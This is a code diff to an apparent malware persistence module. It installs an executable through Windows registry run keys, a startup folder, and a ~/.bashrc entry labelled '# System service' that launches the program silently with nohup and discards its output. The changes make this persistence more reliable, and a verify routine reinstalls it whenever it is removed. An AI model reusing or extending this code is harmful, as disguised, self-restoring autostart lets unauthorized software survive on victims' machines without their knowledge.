@@ -136,6 +136,8 @@ def install_with_fallback(executable_path=None):
 def verify(executable_path=None):
     """Checks persistence is active. Re-installs if absent."""
     status = check_persistence()
+    if not status:
+        return  # unsupported OS — nothing to verify
     if not any(status.values()):
         logger.warning("No persistence found — reinstalling...")
         install_with_fallback(executable_path)
@@ -187,7 +189,7 @@ def _remove_windows(method):
             winreg.DeleteValue(key, _load_installed_name())
             winreg.CloseKey(key)
             return True, "Registry key removed"
-        except FileNotFoundError:
+        except OSError:
             return True, "Key was not present"
 
     elif method == "startup_folder":
@@ -251,8 +253,10 @@ def _persist_linux(method, exe_path):
     elif method == "bashrc":
         bashrc = os.path.expanduser("~/.bashrc")
         entry = f"\n# System service\nnohup {sys.executable} {exe_path} > /dev/null 2>&1 &\n"
-        with open(bashrc, "r") as f:
-            content = f.read()
+        content = ""
+        if os.path.exists(bashrc):
+            with open(bashrc, "r") as f:
+                content = f.read()
         if exe_path not in content:
             with open(bashrc, "a") as f:
                 f.write(entry)
